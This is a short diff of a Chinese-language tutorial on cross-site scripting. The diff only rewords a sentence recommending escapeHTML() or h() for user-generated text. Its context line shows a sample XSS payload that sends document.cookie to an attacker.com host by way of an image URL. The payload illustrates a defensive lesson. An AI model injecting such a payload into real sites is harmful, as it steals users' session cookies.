@@ -9,7 +9,7 @@ XSS - Cross-Site Scripting 是指在輸入資料的欄位輸入惡意程式碼�
 <script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
 ```
 
-要解決這個問題最基本的方法就是用 escapeHTML() 或 h() 處理使用者產生的文字  
+要解決這個問題最基本的方法就是用 escapeHTML() 或 h() 處理並顯示使用者產生的文字  
 
 但有時候我們必須讓使用者可以輸入 HTML 怎麼辦?
 
